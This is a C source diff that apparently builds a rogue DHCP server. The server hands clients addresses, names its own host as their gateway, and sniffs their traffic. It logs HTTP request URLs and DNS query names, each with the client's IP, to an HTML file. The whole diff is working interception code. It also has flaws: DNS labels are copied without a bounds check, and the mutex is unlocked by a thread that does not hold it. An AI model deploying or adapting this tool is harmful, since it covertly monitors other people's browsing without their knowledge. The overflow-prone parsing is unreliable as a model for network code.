@@ -19,23 +19,14 @@
 #include <netinet/ip.h>
 #include <dns_util.h>
 #include <pthread.h>
-#include <sys/ioctl.h>
+#include <sys/types.h>
 #include <resolv.h>
 
 #include "dhcp.h"
 #include "util.h"
 #include "ippool.h"
 #include "ethernet.h"
-
-char ifa_name[IFNAMSIZ + 1];
-
-struct in_addr my_ip;
-struct in_addr brd_addr;
-struct in_addr sub_addr;
-struct in_addr dns_addr;
-char srv_hst_name[] = "NOT-A-ROUTER";
-char dns_srv_addr[] = "8.8.8.8"; // Google Public DNS Server will be used as it's always avaiable
-uint8_t cur_ip = 40;
+#include "http.h"
 
 // Transport Layer protocol numbers
 #define TCP_PROT 0x6
@@ -45,9 +36,34 @@ uint8_t cur_ip = 40;
 #define HTTP_PORT 80
 #define DNS_PORT 53
 
+
+// HTTP Max Url Length
+#define MAX_URL_L 2048
+
+// DNS Query Name Max Length
+#define MAX_QR_L 512
+
+char ifa_name[IFNAMSIZ + 1];
+
+struct in_addr my_ip;
+struct in_addr lst_ip;
+struct in_addr brd_addr;
+struct in_addr sub_addr;
+struct in_addr dns_addr;
+char srv_hst_name[] = "NOT-A-ROUTER";
+char dns_srv_addr[] = "8.8.8.8"; // Google Public DNS Server will be used as it's always avaiable
+uint32_t cur_ip = 40;
+
+// A mutex to be used for writing to the file that contains all urls
+pthread_mutex_t url_file_mutex;
+char url_to_file[MAX_URL_L];
+FILE* url_fp;
+
 /// Returns the next ip for the network
 in_addr_t get_cur_ip() {
-	return ( my_ip.s_addr & sub_addr.s_addr ) + cur_ip;
+	in_addr_t ret_v = ((my_ip.s_addr & sub_addr.s_addr)) + htonl(cur_ip);
+	//d_printf("get_cur_ip() = 0x%08x\n", ret_v);
+	return ret_v;
 }
 
 /// Alloc & Initialze objects.
@@ -111,6 +127,7 @@ void* init_DHCP_server(void* arg) {
 	dhcp_hdr i_hdr, o_hdr;
 	dhcp_opt i_opt, o_opt;
 	in_addr_t i_addr;
+	in_addr_t o_addr;
 	while(1) {
 		// Default Values
 		memset(&i_hdr, 0, sizeof(i_hdr));
@@ -126,10 +143,9 @@ void* init_DHCP_server(void* arg) {
 		// Get Options from Header
 		set_dhcp_opt_from_dhcp_hdr(&i_opt, &i_hdr);
 
-		d_printf("i_addr = %d\n", i_addr);
 		switch(i_opt.dhcp_msg) {
 			case DISCOVER:
-				d_printf("Discover\n");
+				printf("Discover\n");
 				// Header
 				o_hdr.opcode = 0x2; 		// Reply
 				o_hdr.hrd_t = 1; 		// Ethernet
@@ -139,7 +155,7 @@ void* init_DHCP_server(void* arg) {
 				o_hdr.num_s = 0;
 				o_hdr.flags = i_hdr.flags;	// Flags from the client
 				o_hdr.clt_ip = 0;
-				o_hdr.own_ip = inet_addr("192.168.0.40"); // Static Value for Now
+				o_hdr.own_ip = get_cur_ip(); // Static Value for Now
 				o_hdr.srv_ip = my_ip.s_addr;
 				o_hdr.gtw_ip = my_ip.s_addr;
 				memcpy(o_hdr.clt_hrd_addr, i_hdr.clt_hrd_addr, CLT_HRD_ADDR_L);
@@ -153,8 +169,8 @@ void* init_DHCP_server(void* arg) {
 				memcpy(o_opt.rtr_id, o_opt.srv_id, IP_ADDR_L);
 				memcpy(o_opt.sub_msk, &sub_addr.s_addr, IP_ADDR_L);
 				memcpy(o_opt.dns_id, &dns_addr.s_addr, IP_ADDR_L);
-				//o_opt.rnw_time = 10000;
-				//o_opt.rbn_time = 10000;
+				o_opt.rnw_time = 10000;
+				o_opt.rbn_time = 10000;
 
 				// Sets the flags for the header
 				set_dhcp_hdr_from_dhcp_opt(&o_opt, &o_hdr);
@@ -164,14 +180,13 @@ void* init_DHCP_server(void* arg) {
 
 				// Sets the transaction id for the ip
 				set_ip_for_trs_id(get_cur_ip(), i_hdr.trs_id);
-
-				d_printf("Host Name: %s\n",i_opt.hst_name);
-				d_printf("His Ip: %u\n", get_cur_ip());
 				break;
 			case OFFER:
-				d_printf("Offer\n");
+				printf("Offer\n");
 				break;
 			case REQUEST:
+				o_addr = get_ip_for_trs_id(i_hdr.trs_id);
+
 				// Header
 				o_hdr.opcode = 0x2; 		// Reply
 				o_hdr.hrd_t = 1;		// Ethernet
@@ -181,7 +196,7 @@ void* init_DHCP_server(void* arg) {
 				o_hdr.num_s = 0;
 				o_hdr.flags = i_hdr.flags;	// Flags from the client
 				o_hdr.clt_ip = i_hdr.clt_ip;
-				o_hdr.own_ip = inet_addr("192.168.0.40");
+				o_hdr.own_ip =  o_addr == 0 ? get_cur_ip() : o_addr;
 				o_hdr.srv_ip = my_ip.s_addr;
 				o_hdr.gtw_ip = my_ip.s_addr;
 				memcpy(o_hdr.clt_hrd_addr, i_hdr.clt_hrd_addr, CLT_HRD_ADDR_L);
@@ -207,33 +222,36 @@ void* init_DHCP_server(void* arg) {
 				// Sets the transaction id for the ip
 				set_ip_for_trs_id(get_cur_ip(), i_hdr.trs_id);
 
-				d_printf("Host Name: %s\n",i_opt.hst_name);
-				d_printf("His Ip: %u\n", get_cur_ip());
-
 				cur_ip++;
-				d_printf("Request\n");
+				printf("Request\n");
 				break;
 			case DECLINE:
-				d_printf("Decline\n");
+				printf("Decline\n");
 				break;
 			case ACK:
-				d_printf("Ack\n");
+				printf("Ack\n");
 				break;
 			case NAK:
-				d_printf("Nak\n");
+				printf("Nak\n");
 				break;
 			case RELEASE:
-				d_printf("Release\n");
+				printf("Release\n");
 				break;
 			case INFORM:
-				d_printf("Inform\n");
+				printf("Inform\n");
 				break;
 			case INVALID:
-				d_printf("Invalid\n");
+				printf("Invalid\n");
 				break;
 		}
 	}
 	return NULL;
+}
+
+void append_url_to_file(char* url) {
+	strcpy(url_to_file, url);
+	pthread_mutex_unlock(&url_file_mutex);
+	printf("saving url %s\n", url);
 }
 
 //Monitor the HTTP network traffic
@@ -243,20 +261,32 @@ void init_sniffer() {
 	// Begin listening for Ethernet Frames
 	d_printf("Ethernet Payload Length: %u\n", ETHER_MAX_LEN - ETHER_HDR_LEN);
 	eth_frm *frame = calloc(sizeof(struct ether_header) + ETHER_MAX_LEN - ETHER_HDR_LEN, 1);
-	for(;;) {
+	while(1) {
 
 		size_t read_bytes = wait_eth_frame(&frame);
-		d_printf("%lu bytes\n", read_bytes);
-		d_printf("[Ethernet");
+		//d_printf("0x%x bytes\n", read_bytes);
+		d_printf("{Ethernet");
 		if( ntohs(frame->hdr.ether_type) == ETHERTYPE_IP ) {
 				struct ip *iphdr = (struct ip*)frame->payload;
 				d_printf("-Ip");
-				if( iphdr->ip_p == TCP_PROT ) {
+				lst_ip = iphdr->ip_src;
+				/*if( strcmp(inet_ntoa(iphdr->ip_src), inet_ntoa(my_ip)) == 0 ) {
+					d_printf("-");
+				}else */if( iphdr->ip_p == TCP_PROT ) {
 					struct tcphdr* tcp = (struct tcphdr*)(frame->payload + sizeof(struct ip));
 					d_printf("-TCP");
 					d_printf("(s:%u, d:%u)", ntohs(tcp->th_sport), ntohs(tcp->th_dport));
+					uint8_t tcphdr_l = tcp->th_off*4;
 					if( ntohs(tcp->th_dport) == HTTP_PORT ) {
 							d_printf("-HTTP");
+							char *http_buf = (char*)(frame->payload + sizeof(struct ip) + tcphdr_l );
+							char url[MAX_URL_L];
+							if( set_addr_from_get_buf(url, http_buf) != 0 ) {
+								d_printf("%s", url);
+								append_url_to_file(url);
+							}else{
+								d_printf("-*");
+							}
 					}else{
 						d_printf("-*");
 					}
@@ -268,7 +298,20 @@ void init_sniffer() {
 						dns_header_t* dns = (dns_header_t*)(frame->payload + sizeof(struct ip) + sizeof(struct udphdr));
 						d_printf("-DNS");
 						d_printf("-%s", (ntohs(dns->flags) & 0x8000) == 0 ? "Query" : "Response");
-						//d_printf("(n:%x, qc: %x, ac: %u)", ntohs(dns->xid), ntohs(dns->qdcount), ntohs(dns->ancount));
+						if( (ntohs(dns->flags) & 0x8000) == 0 ) { // Query
+							char url[MAX_QR_L];
+							memset(url, 0, MAX_QR_L);
+							uint8_t* ptr = (uint8_t*)(frame->payload + sizeof(struct ip) + sizeof(struct udphdr) + sizeof(dns_header_t));
+							while (*ptr != 0) {
+								uint8_t len = *ptr;
+								memcpy(url + strlen(url), ptr + 1, len);
+								url[strlen(url)] = '.';
+								ptr += len + 1;
+							}
+							url[strlen(url) - 1] = '\0';
+							d_printf("[where is %s?]", url);
+							append_url_to_file(url);
+						}
 					}else{
 						d_printf("-*");
 					}
@@ -278,45 +321,27 @@ void init_sniffer() {
 		}else{
 			d_printf("-*");
 		}
-		d_printf("]\n");
+		d_printf("} - %u\n", read_bytes);
 	}
 }
-	/*int sock_raw;
-	struct ifreq interfaceFlags;
 
-	//Create a raw socket that shall sniff
-	sock_raw = socket(PF_PACKET, SOCK_PACKET, htons( ETH_P_ALL ));
-	if(sock_raw < 0) {
-        	printf("Socket Error\n");
-        	return;
-    	}
 
-	//strncpy(interfaceFlags.ifr_name, "enp4s0", IFNAMSIZ);
-	strncpy(interfaceFlags.ifr_name, ifa_name, IFNAMSIZ-1);
+void* init_url_thread(void* arg) {
 
-	/// Gets the initial flags for the interface
-	if(ioctl(sock_raw, SIOCGIFFLAGS, &interfaceFlags) < 0 ) {
-		perror("Error in interface flags obtainance");
-		return;
+	url_fp = fopen("urls.htm", "a");
+	if( !url_fp ) {
+		d_printf("Error while creating file for the urls\n");
+		return NULL;
 	}
 
-        // Sets the interface to promiscuos
-        interfaceFlags.ifr_flags |= IFF_PROMISC;
-        if(ioctl(sock_raw, SIOCSIFFLAGS, &interfaceFlags) < 0) {
-                perror("Error while setting interface to promiscuos");
-                return;
-        }
-
-	char *ip = (char*)malloc(64), *host = (char*)malloc(64);
 	while (1) {
-		if (wait_packet(sock_raw, &host, &ip, 0)) {
-			printf("(%s) %s\n", ip, host);
-			//while (wait_packet(sock_raw, &host, &ip, 1) != 1);
-			//printf("OK\n");
-		}
+		printf("waiting urls\n");
+		pthread_mutex_lock(&url_file_mutex);
+		fprintf(url_fp, "<li><a href=\"%s\">%s</a> - %s</li>\n ", url_to_file, url_to_file, inet_ntoa(lst_ip));
+		fflush(url_fp);
 	}
-
-	close(sock_raw);*/
+	return NULL;
+}
 
 int main(int argc, char** argv) {
 	// Gets Initial Flags
@@ -328,12 +353,18 @@ int main(int argc, char** argv) {
 	// Register exit function
 	atexit(deinit);
 
-	pthread_t thread;
+	pthread_t dhcp_thread;
+	pthread_t url_thread;
 
-	/*if( pthread_create(&thread, NULL, &init_DHCP_server, NULL) != 0 ) {
-		d_printf("pthread_create(DHCP)\n");
-	}*/
+	if( pthread_create(&dhcp_thread, NULL, &init_DHCP_server, NULL) != 0 ) {
+		d_printf("pthread_create(dhcp_thread)\n");
+	}
 
+	pthread_mutex_init(&url_file_mutex, NULL);
+	pthread_mutex_lock(&url_file_mutex);
+	if( pthread_create(&url_thread, NULL, &init_url_thread, NULL) != 0 ) {
+		d_printf("pthread_create(url_thread)\n");
+	}
 
 	init_sniffer();
 
